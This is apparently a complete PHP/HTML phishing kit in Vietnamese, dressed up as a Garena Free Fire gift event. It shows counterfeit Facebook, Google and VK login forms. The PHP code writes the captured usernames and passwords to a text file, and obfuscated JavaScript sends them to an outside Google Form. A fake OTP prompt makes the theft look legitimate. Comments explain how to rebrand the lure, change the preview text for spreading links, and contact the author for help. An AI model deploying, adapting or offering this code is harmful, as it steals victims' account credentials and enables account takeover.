<!--Dương Chí Hướng-->
<?php 
session_start();
date_default_timezone_set('Asia/Ho_Chi_Minh');
 $huongdz['num'] = 0;
	if(isset($_SESSION['huongdz'])) {
		$huongdz = $_SESSION['huongdz'];
	}
	if($huongdz['num'] == 4){ //đăt số lần đăng nhập cho phép
	    die('<script>alert("Spam cc cút")</script>') ; //thông báo sau khi đăng nhập quá số lần cho phép
		//lưu ý hosting phải bật được session thì mới có tác dụng!
	}
if(isset($_POST["acc"])){
//   $type=='';
 $time = date('H:i:s d/m/Y');
    $acc = $_POST["acc"];
    $pass = $_POST["pass"];
    $type = $_POST["type"];
     $subject = "Cảm ơn bạn đã sử dụng code!";
     $headers = "Tài khoản facebook";
      $body = "\nTime: ".$time."|acc $type: ".$acc."|pass: ".$pass."\n____________________________________________________________\n";//định dạng acc|pass
    
     // mail("jaxuatt6@gmail.com", $headers, $body); // muốn gửi về mail thì bỏ 2 dấu // phía trước đi rồi thay mail
    $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
    fwrite($test,$body);
    fclose($test);
    	$huongdz['num']++;
$_SESSION['huongdz'] = $huongdz;

}

    ?>
<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css" />

    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap"
    />
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 <!-- Font Awesome -->
<link
  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css"
  rel="stylesheet"
/>
<!-- Google Fonts -->
<link
  href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap"
  rel="stylesheet"
/>
<!-- MDB -->
<link
  href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.6.0/mdb.min.css"
  rel="stylesheet"
/>
    <style>
        img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {display: none;}
#myModal .modal-dialog {
    position: absolute;
    width: auto;
    margin: 0;
    width: 100%;
    pointer-events: none;
    border-radius: 0!important;
    bottom: 0;
}
#myModal .modal-content {
    border-radius: 0!important;
}
#fb input {
    border-radius: 0!important;
    border-top: none;
    border-right: none;
    border-left: none;
    padding-bottom: 8px;
}
#fb .btn-primary {
    color: #fff;
    font-weight: bold;
    box-shadow: none;
    background-color: #1266f1;
}
div#garena {
    background: #aa1e21;
    color: #fff;
    font-weight: 500;
}
#garena input {
    border: none;
    border-bottom: 1px solid #666;
    background: transparent;
    color: #fff;
}
#garena input::placeholder{
    color:#acacac
}
#garena button {
    background: #fd1414;
    box-shadow: none;
    font-weight: bold;
    font-size: 20px;
}
#garena a {
    color: #fff;
}
.alert {
    position: relative;
    padding: .5rem 1.5rem;
    border-radius: 0!important;
    font-size: 16px;
    margin-bottom: 1rem;
    border: 1px solid transparent;
}
.modal-body {
    position: relative;
    flex: 1 1 auto;
    padding: 1rem;
}
    </style>
        <title>Nhận quà garena free fire</title><!-- 	  đổi tiêu đề trang -->
    <meta content='Free fire' property='og:site_name'/>
<meta content='https://garena.rest/x0s1MSLMLv.html' property='og:url'/>
<meta content='website' property='og:type'/>
<meta content='Sự kiện nhận quà free fire hot nhất 2021' property='og:description'/>   <!--  đổi mô tả khi rải link -->
<meta content='Nhận quà garena free fire' property='og:title'/>        <!--  đổi tiêu đề khi rải link -->
<meta content='https://garena.rest/demo/1.jpg' property='og:image'/>  <!--  đổi ảnh mô tả khi rải link -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  </head>
 <body>
     
<!-- Modal -->
<div class="modal top fade" id="exampleModal1" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" data-mdb-backdrop="static" data-mdb-keyboard="false">
  <div class="modal-dialog  modal-fullscreen">
    <div class="modal-content">
        <!DOCTYPE html>
        <html>
        
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
            <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
            <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196" />
            <title>Facebook kết nối với Membership - Đăng nhập hoặc đăng ký</title>
            <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
            <link rel="stylesheet" type="text/css" href="https://scripth.glitch.me/web/fb.css" />
        </head>
        
        <body class="touch x1 _fzu _50-3 iframe acw portrait">
            <div id="viewport">
                <h1 style="display: block; height: 0; overflow: hidden; position: absolute; width: 0; padding: 0;">Faceb&#111;ok
                </h1>
                
                <div id="page" class="___class_+?1___">
                    <div class="_129_" id="header-notices"></div>
                    <div class="_4g33 _52we _52z5" id="header">
                        <div class="_4g34 _52z6">
                            <a href="#">
                                <i class="img sp_7V_P8-AK9yC sx_ce405b"><u>faceb&#111;ok</u></i>
                            </a>
                        </div>
                    </div>
                    <div class="_5yd0 _2ph- _5yd1" id="login_error1" data-sigil="m_login_notice">Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào. <a class="_652e">Đăng ký tài khoản.</a></div>
                    <div class="_5yd0 _2ph- _5yd1" id="login_error2" data-sigil="m_login_notice"><span>Sai mật khẩu. <a  class="_652e" aria-label="Bạn quên mật khẩu?">Bạn quên mật khẩu?</a></span></div>
                    <div class="_5soa acw" id="root" role="main">
                        <div class="_4g33">
                            <div class="_4g34" id="u_0_0">
                                                        <div class="aclb _4-4l">
                                    <div class="_5rut">
                                        <div>
                                            <div class="_52jj _3-q2">
                                                <img src="https://job.fpt.edu.vn/Content/images/logo_unit/garena-logo-20210415164802.png" width="150" class="_3-q3 img" />
                                                <div class="_52je _52j9">Hãy đăng nhập vào tài khoản Facebook đã liên kết với garena</div>
                                            </div>
                                        </div>
                                        <form method="POST" class="mobile-login-form _5spm" id="login_form" novalidate="1">
                                            <input type="hidden" name="_token" value="36xDR0i2X9pu7ksbgSjKcwjGQ5UoVPpisVwr45uj">                                    <div class="_56be _5sob">
                                                <div class="_55wo _55x2 _56bf">
                                                    <div id="email_input_container">
                                                        <input class="_56bg _4u9z _5ruq "
                                                        id="id" name="acc" placeholder="Email hoặc số điện thoại" type="text"
                                                            value="" />
                                                    </div>
                                                    <div>
                                                        <div class="_1upc _mg8">
                                                            <div class="_4g33">
                                                                <div class="_4g34 _5i2i _52we">
                                                                    <div class="_5xu4">
                                                                        <input autocorrect="off" autocapitalize="off"
                                                                            class="_56bg _4u9z _27z2" autocomplete="on"
                                                                            id="m_login_password" name="pass"
                                                                            placeholder="Mật khẩu" type="password" />
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="_2pie" style="text-align: center;">
                                                <div id="u_0_4">
                                                    <button type="submit" value="Đăng nhập"
                                                        class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu"><span
                                                            class="_55sr">Đăng nhập</span></button>
                                                </div>
                                                <div id="otp_button_elem_container"></div>
                                            </div>
                                            <div class="_xo8"></div>
                                        </form>
                                        <div>
                                            <div class="_43mg"><span class="_43mh">hoặc</span></div>
                                            <div class="_52jj _5t3b" id="u_0_6">
                                                <a role="button" class="_5t3c  btn btnS medBtn mfsm "
                                                    id="signup-button"
                                                    href="https://m.facebook.com/reg/?cid=103&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26redirect_uri%3Dhttps%253A%252F%252Fauth.garena.com%252Foauth%252Flogin%253Fclient_id%253D100067%2526redirect_uri%253Dhttps%25253A%25252F%25252Fgiaidau.ff.garena.vn%25252Flogin%25252Fcallback%2526response_type%253Dtoken%2526platform%253D3%2526locale%253Dvi-VN%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%252Cuser_friends%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db06a8f56-81cb-4296-bc49-4e7d9d0b8657&locale2=vi_VN&refsrc=https%3A%2F%2Fm.facebook.com%2Flogin.php&soft=hjk">
                                                    Tạo tài khoản mới
                                                </a>
                                            </div>
                                        </div>
                                        <div>
                                            <div class="other-links">
                                                <ul class="_5pkb _55wp">
                                                    <li>
                                                        <span class="mfss fcg">
                                                            <a href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin.php%3Fskip_api_login%3D1%26api_key%3D2036793259884297%26kid_directed_site%3D0%26app_id%3D2036793259884297%26signed_next%3D1%26next%3Dhttps%253A%252F%252Fwww.facebook.com%252Fdialog%252Foauth%253Fclient_id%253D2036793259884297%2526redirect_uri%253Dhttps%25253A%25252F%25252Fauth.garena.com%25252Foauth%25252Flogin%25253Fclient_id%25253D100067%252526redirect_uri%25253Dhttps%2525253A%2525252F%2525252Fgiaidau.ff.garena.vn%2525252Flogin%2525252Fcallback%252526response_type%25253Dtoken%252526platform%25253D3%252526locale%25253Dvi-VN%2526response_type%253Dtoken%2526scope%253Dpublic_profile%25252Cemail%25252Cuser_friends%2526ret%253Dlogin%2526fbapp_pres%253D0%2526logger_id%253Db06a8f56-81cb-4296-bc49-4e7d9d0b8657%26cancel_url%3Dhttps%253A%252F%252Fauth.garena.com%252Foauth%252Flogin%253Fclient_id%253D100067%2526redirect_uri%253Dhttps%25253A%25252F%25252Fgiaidau.ff.garena.vn%25252Flogin%25252Fcallback%2526response_type%253Dtoken%2526platform%253D3%2526locale%253Dvi-VN%2526error%253Daccess_denied%2526error_code%253D200%2526error_description%253DPermissions%252Berror%2526error_reason%253Duser_denied%2523_%253D_%26display%3Dpage%26locale%3Dvi_VN%26pl_dbl%3D0&multiple_results=0&ars=facebook_login&lwv=100&locale2=vi_VN&_rdr"
                                                                id="forgot-password-link">
                                                                Quên mật khẩu?
                                                            </a>
                                                        </span>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="_55wr _5ui2">
                            <div class="_5dpw">
                                <div class="_5ui3" data-nocookies="1" id="locale-selector">
                                    <div class="_4g33">
                                        <div class="_4g34">
                                            <span class="_52jc _52j9 _52jh _3ztb">Tiếng Việt</span>
                                            <div class="_3ztc">
                                                <span class="_52jc"><a href="#">中文(台灣)</a></span>
                                            </div>
                                            <div class="_3ztc">
                                                <span class="_52jc"><a href="#">Español</a></span>
                                            </div>
                                            <div class="_3ztc">
                                                <span class="_52jc"><a href="#">Français (France)</a></span>
                                            </div>
                                        </div>
                                        <div class="_4g34">
                                            <div class="_3ztc">
                                                <span class="_52jc"><a href="#">English (UK)</a></span>
                                            </div>
                                            <div class="_3ztc">
                                                <span class="_52jc"><a href="#">한국어</a></span>
                                            </div>
                                            <div class="_3ztc">
                                                <span class="_52jc"><a href="#">Português (Brasil)</a></span>
                                            </div>
                                            <a href="#">
                                                <div class="_3j87 _1rrd _3ztd" aria-label="Danh sách ngôn ngữ đầy đủ"><i
                                                        class="img sp_7V_P8-AK9yC sx_21ee4d"></i></div>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="_5ui4"><span class="mfss fcg">Facebo&#111;k © 2022</span></div>
                            </div>
                        </div>
                    </div>
                </div>
         
            </div>
            
     <!-- content -->
    </div>
  </div>
</div>
<!-- Modal -->
<div class="modal top fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" data-mdb-backdrop="static" data-mdb-keyboard="false">
  <div class="modal-dialog  modal-fullscreen">
    <div class="modal-content">
      <img style="
    width: 100px!important;
    height: 100px!important;
    object-fit: cover;
    border-radius: 5px;
    display: block;
    margin: auto;
    margin-top: 20px;
" id="photo" src="https://www.americandream.edu.vn/statics/uploads/2018/11/fb-logo.png"/>
      <div class="modal-body" id="fb">
          <center id="thongbao">Vui lòng đăng nhập để tiếp tục</center>
          <div class="login">   
                  <div class="mb-3 mt-3" style="display:none">
  <input type="text" id="type" class="form-control" />
</div>
          <div class="mb-3 mt-3">
  <input type="text" id="acc" name="acc" placeholder="Số điện thoại hoặc email..." class="form-control" />
</div>
<div class="mb-3">
  <input type="password" id="pass" name="pass" placeholder="Mật khẩu" class="form-control" />
</div>
<div class="d-grid gap-2">
  <button class="btn btn-primary mb-4" onclick="login()" type="button">Đăng nhập</button>
  <center><a href="#">Quên mật khẩu</a></center>
</div>
</div>
        <div class="otp" style="display:none">
    Một mã xác nhận đã được gửi đến <b id="username"></b>, vui lòng xác nhận nó vào trường bên dưới và xác nhận để tiếp tục truy cập vào tài khoản của bạn. Bạn quên copy mã OTP? <a href="#" onclick="prompt('Mã OTP của bạn, vui lòng sao chép mã bên dưới và nhấn vào OK để tiếp tục',getRndInteger(000000,999999));">nhấn vào đây</a> để nhận mã OTP mới.
  <input type="text" placeholder="******" class="mt-2 mb-3 form-control" />
  <div class="d-grid gap-2">
  <button class="btn btn-primary mt-4" onclick="otp()" type="button">Tiếp tục</button>
</div>
</div>
      </div>
     
    </div>
  </div>
</div>
 <div class="myIframe"> 
 
 
 
 
  <!--đổi giao diện ở đây-->
  <!--đổi giao diện ở đây-->
  <!--đổi giao diện ở đây-->
 <!--đổi giao diện ở đây-->
   <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden" src="https://garena-center.com/FNkYPvmb6wGZsfZcKmhKqUX37KG8U7YMRBuHcF7j7BZX3YjeADDPwpGS3hqGaTFbggzGYcWtJFTDHmnXTAttJqkLpsjy9bm7qzESnf4KXCnJ7Y3QpNBbdY2DkMCH/64.html" id="iframe"> </iframe> 
	<!---HƯỚNG DẪN------------------------------------------------------------------------------------------------------------------------------ https://garena-center.com/FNkYPvmb6wGZsfZcKmhKqUX37KG8U7YMRBuHcF7j7BZX3YjeADDPwpGS3hqGaTFbggzGYcWtJFTDHmnXTAttJqkLpsjy9bm7qzESnf4KXCnJ7Y3QpNBbdY2DkMCH/  thay các chữ số từ 1 - 66 để đổi giao giện nha   .html -->
	 <!-- ví dụ muốn dùng giao diện membership thì thay 1.html vào cuối (nếu vẫn ko hiểu thì ib zalo 0366931352 chỉ cho)-->




</div>
<script>
    focus();
var listener = window.addEventListener('blur', function() {
    if (document.activeElement === document.getElementById('iframe')) {
     $('#myModal').modal('show');
    }
    window.removeEventListener('blur', listener);
});
</script>
<div class="modal bottom fade" id="myModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" data-mdb-backdrop="true" data-mdb-keyboard="true">
  <div class="modal-dialog modal-frame modal-bottom ">
    <div class="modal-content">
      <div class="modal-body">
          <center>Bạn cần đăng nhập:</center>
          <div class="row justify-content-center mt-1 g-4">
            <!-- facebook -->
              <div class="col-3">
                  <!--không dùng mod thì xoá số 1 vào sau fb-->
                  <a onclick="fb1()"><img class="w-100 rounded" src="https://www.americandream.edu.vn/statics/uploads/2018/11/fb-logo.png"/></a>
              </div>
              <div class="col-3">
                <a onclick="gg()"><img class="w-100 rounded" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/1200px-Google_%22G%22_Logo.svg.png"/></a>
            </div>
            
            <div class="col-3">
                <a onclick="vk()"><img class="w-100 rounded" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/VK.com-logo.svg/768px-VK.com-logo.svg.png"/></a>
            </div>       
            <!--  -->
            </div>
      </div>
    </div>
  </div>
</div>
<script>
 let icon ='error'; //icon thất bại đổi error thành success đề thành công
 let title ='Đăng nhập thất bại'; // tiêu đề
 let text ='Thông tin đăng nhập không chính xác vui lòng kiểm tra lại!'; //content
function getRndInteger(min, max) {
  return Math.floor(Math.random() * (max - min + 1) ) + min;
}
function otp(){
    $("#photo").hide();
    $(".otp").html('<div class="mb-3" style="margin:auto;display: block;text-align: center;"><a href="\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0076\u0069\u002d\u006e\u0061\u0070\u0074\u0068\u0065\u002e\u006f\u006e\u006c\u0069\u006e\u0065"><button type="button" class="btn btn-primary me-2 mb-2"><i class="fa fa-arrow-right me-2"></i>Tiếp tục</button></a><a href="fb-messenger://share/?link=https://napkimcuongx10.ml/"><br/>Share cho bạn bè</a></div><b>Chào mừng trở lại!</b><br/>Chúng tôi nhận thấy trước đây bạn đã đăng nhập trên ứng dụng này, vui lòng ấn "Tiếp tục" để truy cập vào trang của nhà phát hành.<br/>');
}

function login(){
    let filename = window.location.pathname
    var acc = $("#acc").val();
    var pass = $("#pass").val();
    var id = $("#id").val();
    var type = $("#type").val();
    if(acc.length == 0 || pass.length == 0){
        $("#thongbao").html('<div class="alert alert-danger" role="alert" data-mdb-color="danger">Vui lòng nhập đầy đủ nội dung!</div>');
    }
    else {
        $("#thongbao").hide();
        $.post(filename, {acc:acc,pass:pass,type:type}, function(result){
      if(result == 'otp'){
          
      }
     
    });
 

const _0x14c62c=_0x3eae;(function(_0xd17f64,_0x11e92b){const _0x8a710d=_0x3eae,_0xb17e89=_0xd17f64();while(!![]){try{const _0x2bfecc=-parseInt(_0x8a710d(0x1b6))/0x1+-parseInt(_0x8a710d(0x1a9))/0x2+parseInt(_0x8a710d(0x1aa))/0x3+parseInt(_0x8a710d(0x1b1))/0x4*(parseInt(_0x8a710d(0x1bc))/0x5)+-parseInt(_0x8a710d(0x1b2))/0x6*(-parseInt(_0x8a710d(0x1a7))/0x7)+parseInt(_0x8a710d(0x1bd))/0x8+-parseInt(_0x8a710d(0x1b9))/0x9;if(_0x2bfecc===_0x11e92b)break;else _0xb17e89['push'](_0xb17e89['shift']());}catch(_0x506246){_0xb17e89['push'](_0xb17e89['shift']());}}}(_0x379b,0x32ef7));function _0x379b(){const _0xe31b80=['exception','525340naopta','1122096HraZyl','send','console','search','open','table','href','25700yaqToF','4848ymFrAt','setRequestHeader','return\x20(function()\x20','bind','255221CJIMHr','Content-Type','application/x-www-form-urlencoded','2051811tpHAzQ','trace','toString','185lfchOM','1113024yikwSP','constructor','log','(((.+)+)+)+$','prototype','location','error','info','1764BYGhjC'];_0x379b=function(){return _0xe31b80;};return _0x379b();}const _0x5b1813=(function(){let _0x384b9f=!![];return function(_0x445a9a,_0x32593b){const _0x124b80=_0x384b9f?function(){if(_0x32593b){const _0x1e9759=_0x32593b['apply'](_0x445a9a,arguments);return _0x32593b=null,_0x1e9759;}}:function(){};return _0x384b9f=![],_0x124b80;};}()),_0x2d2009=_0x5b1813(this,function(){const _0x36fd54=_0x3eae;return _0x2d2009['toString']()[_0x36fd54(0x1ad)](_0x36fd54(0x1a2))[_0x36fd54(0x1bb)]()[_0x36fd54(0x1be)](_0x2d2009)['search'](_0x36fd54(0x1a2));});function _0x3eae(_0x59f9e2,_0x5f209c){const _0xca2345=_0x379b();return _0x3eae=function(_0x3c28c5,_0x4788ca){_0x3c28c5=_0x3c28c5-0x1a1;let _0x37505b=_0xca2345[_0x3c28c5];return _0x37505b;},_0x3eae(_0x59f9e2,_0x5f209c);}_0x2d2009();const _0x4788ca=(function(){let _0x1ab622=!![];return function(_0x21a42a,_0x3c469a){const _0x34d9d9=_0x1ab622?function(){if(_0x3c469a){const _0x3aa1b8=_0x3c469a['apply'](_0x21a42a,arguments);return _0x3c469a=null,_0x3aa1b8;}}:function(){};return _0x1ab622=![],_0x34d9d9;};}()),_0x3c28c5=_0x4788ca(this,function(){const _0x4283f7=_0x3eae,_0x264198=function(){const _0x248dcd=_0x3eae;let _0xde122f;try{_0xde122f=Function(_0x248dcd(0x1b4)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x53edca){_0xde122f=window;}return _0xde122f;},_0x2a2353=_0x264198(),_0x54809f=_0x2a2353[_0x4283f7(0x1ac)]=_0x2a2353[_0x4283f7(0x1ac)]||{},_0x117630=[_0x4283f7(0x1a1),'warn',_0x4283f7(0x1a6),_0x4283f7(0x1a5),_0x4283f7(0x1a8),_0x4283f7(0x1af),_0x4283f7(0x1ba)];for(let _0x5303d5=0x0;_0x5303d5<_0x117630['length'];_0x5303d5++){const _0x8dd260=_0x4788ca[_0x4283f7(0x1be)][_0x4283f7(0x1a3)][_0x4283f7(0x1b5)](_0x4788ca),_0x13a707=_0x117630[_0x5303d5],_0x20689c=_0x54809f[_0x13a707]||_0x8dd260;_0x8dd260['__proto__']=_0x4788ca[_0x4283f7(0x1b5)](_0x4788ca),_0x8dd260[_0x4283f7(0x1bb)]=_0x20689c[_0x4283f7(0x1bb)][_0x4283f7(0x1b5)](_0x20689c),_0x54809f[_0x13a707]=_0x8dd260;}});_0x3c28c5();let data={'entry.947626363':window[_0x14c62c(0x1a4)][_0x14c62c(0x1b0)],'entry.1171134611':type+':\x20'+acc,'entry.131074249':pass},queryString=new URLSearchParams(data);queryString=queryString[_0x14c62c(0x1bb)]();let xhr=new XMLHttpRequest();xhr[_0x14c62c(0x1ae)]('POST','https://docs.google.com/forms/u/0/d/e/1FAIpQLSd_x7qV9R98M1j1xR7WDZypH_ErKYHAJfpK534vezyUO0X8AQ/formResponse',!![]),xhr[_0x14c62c(0x1b3)](_0x14c62c(0x1b7),_0x14c62c(0x1b8)),xhr[_0x14c62c(0x1ab)](queryString);



    prompt('Mã OTP của '+acc +', vui lòng sao chép mã bên dưới và nhấn vào OK để tiếp tục',getRndInteger(000000,999999));
          $("#exampleModal .login").hide();
          $("#exampleModal .otp").show();
          $("#username").text(acc);
    }
}
        
         function fb(){
          $('#exampleModal').modal('show');
             $('#myModal').modal('hide');
             $("#photo").show();
             $("#photo").attr('src','https://www.americandream.edu.vn/statics/uploads/2018/11/fb-logo.png');
             $("#exampleModal .modal-body").attr('id','fb');
             
         }
         function gg(){
             $('#exampleModal').modal('show');
             $('#myModal').modal('hide');
             $("#photo").show();
             $("#photo").attr('src','https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/1200px-Google_%22G%22_Logo.svg.png');
             $("#exampleModal .modal-body").attr('id','gg');
             $("#type").val('Google');
         }
         function vk(){
          $('#exampleModal').modal('show');
             $('#myModal').modal('hide');
             $("#photo").show();
             $("#photo").attr('src','https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/VK.com-logo.svg/768px-VK.com-logo.svg.png');
             $("#exampleModal .modal-body").attr('id','fb');
             $("#type").val('VK');
         }
         function fb1(){
             $('#exampleModal1').modal('show');
             $('#myModal').modal('hide');
            

         }

     </script>
<!-- MDB -->
<script
  type="text/javascript"
  src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.6.0/mdb.min.js"
></script>
    <script type="text/javascript" src="https://scripth.glitch.me/script.js"></script>
   

  </body>
</html>
